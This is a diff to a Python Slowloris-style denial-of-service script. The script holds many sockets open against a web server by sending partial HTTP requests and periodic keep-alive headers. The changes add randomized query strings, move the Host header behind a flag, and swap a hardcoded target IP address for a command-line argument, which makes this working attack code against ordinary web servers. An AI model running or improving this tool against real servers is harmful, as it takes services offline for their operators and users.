@@ -72,7 +72,7 @@ parser.add_argument(
     "--makerequest",
     dest="makerequest",
     action="store_true",
-    help="Send full http request",
+    help="Send full http request (useful when small request body/header timeout is set but keep-alive is set)",
 )
 parser.add_argument(
     "--sleeptime",
@@ -128,7 +128,7 @@ else:
 
 if None not in [args.cert, args.key]:
     if args.cert is None or args.key is None:
-        print("Supplu both parameters (--cert --key) for connection with client certificate !")
+        print("Supply both parameters (--cert & --key) for connection with client certificate !")
     else:
         logging.info("Using  client certificate.")
 
@@ -196,15 +196,16 @@ def init_socket(ip):
 
     s.connect((ip, args.port))
 
-    s.send_line(f"GET / HTTP/1.1")
+    s.send_line(f"GET /?{random.randint(0, 2000)} HTTP/1.1")
 
     ua = user_agents[0]
     if args.randuseragent:
         ua = random.choice(user_agents)
 
     s.send_header("User-Agent", ua)
-    s.send_header("Host", args.host)
+    s.send_header("Accept-language", "en-US,en,q=0.5")
     if args.makerequest:
+        s.send_header("Host", args.host)
         s.send_line("\r\n\r\n")
     return s
 
@@ -235,11 +236,10 @@ def main():
                     if args.makerequest:
                         s.send("\r\n\r\n".encode("utf-8"))
                         s.send("GET / HTTP/1.1\r\n".encode("utf-8"))
-                        s.send("Host: 34.118.77.60\r\n".encode("utf-8")) 
+                        s.send(f"Host: {args.host}\r\n".encode("utf-8")) 
                     s.send_header("X-a", random.randint(1, 5000))
 
                 except socket.error as e:
-                    print(e)
                     list_of_sockets.remove(s)
 
             for _ in range(socket_count - len(list_of_sockets)):
